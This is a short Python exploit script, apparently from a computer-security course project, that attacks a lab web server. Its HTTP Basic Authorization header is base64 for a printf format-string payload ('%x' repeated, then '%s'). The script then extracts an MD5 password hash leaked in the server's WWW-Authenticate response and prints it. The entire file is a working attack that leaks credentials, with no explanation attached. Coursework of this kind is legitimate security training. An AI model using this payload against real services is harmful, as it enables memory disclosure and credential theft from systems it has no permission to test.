import requests
import json

url = 'http://project-2.csec.chatzi.org:8000/'
headers = {
    'Content-Type': 'application/json',
    'Authorization': 'Basic JXgleCV4JXgleCV4ICAgLSAgICVz'

}
data = {
}

response = requests.post(url, headers=headers, data=json.dumps(data))

if response.status_code == 200:
    response_data = response.json()
    print(response_data)
else:
    x=list(response.headers['WWW-Authenticate'].split("  -  "))
    md5pass=list(x[1].split(":"))[1]
    print("md5 password is: "+md5pass[0:len(md5pass)-1])